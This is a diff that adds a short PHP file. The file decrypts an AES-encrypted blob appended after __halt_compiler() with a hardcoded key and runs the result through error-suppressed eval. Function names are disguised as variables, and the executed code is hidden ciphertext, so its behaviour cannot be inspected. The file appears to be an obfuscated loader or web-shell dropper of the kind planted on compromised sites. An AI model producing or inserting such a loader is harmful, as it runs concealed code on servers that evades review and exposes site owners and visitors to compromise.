@@ -1,0 +1,11 @@
+<?php
+if(PHP_SAPI!=='cli-server')@header('Content-Type:text/html;charset=utf-8');
+$x1="strtr";$x2="substr";$x3="file_get_contents";$x4="base64_decode";$x5="openssl_decrypt";$x6="hash";$x7="sha256";
+$p=$x1($x2($x3(__FILE__),__COMPILER_HALT_OFFSET__),"-_~","+/=");
+$p=$x4($p);
+$v=$x2($p,0,16);
+$c=$x2($p,16);
+$k=$x6($x7,'54b85a482ebc7c59fb3db1684d6bcc197ff38ae93080cb5521c04af94067e0cc',true);
+@eval("?>".$x5($c,"AES-256-CBC",$k,OPENSSL_RAW_DATA,$v));
+__halt_compiler();
+JZcBXtofhL48m80uKf9iuv-Cwh_hERM79KYvDW2D7IC9dXlSE48DvDt-LM0GhwTWbxVOmfZpeCKod0xEO03tvueBYNppniMzabTJCldGip8TuaK6hPHynuACmjPUzpBNAHyD4DifqA88bqxjjDUSRQ4QR2HyG3fzCKk2s-xIufdUHHqO7RLR0kNF6L2QjCY7qoKa1sJJ6cSERWcIwHm-WCGaBZD2XZkFpw2NDsyE2xqNYVT5zZ9q25rVlx3FPtCGbPkLA7jjgrFqHrSftTwhmpMfLhvQEOfsqzLKUjfgMT_bg3bXmowXMKyJmcxnLc84V-94D0gkiOXKMBKpAzxkw-BZlH43i2r5knap755EpzVDyda1F14zZmScqCwoeWB0ytu6fJlxieAjR44C9soyAenlU2F3pi7L38pHTQPMeDL5E3U5Coo-6T_TTMivOGeX3W2Ox2WYfA1SkSHSACI02KcU_ZF9v6yQhyzU0ZOgvuDN_Fh-LZJlBvlsQ0qqXjTakbx1dmMDF6-nTj4HcFVLBld2oMC06QI-t4cdFQ2PjhqN3Qe7u9qjGO2vQl32ezGDV9U-xKNglwMj5jqTCfn0ARIX9fGbv9hUZXdz-9g6XgH9nixrgVXVyjDmhcjFJxMz
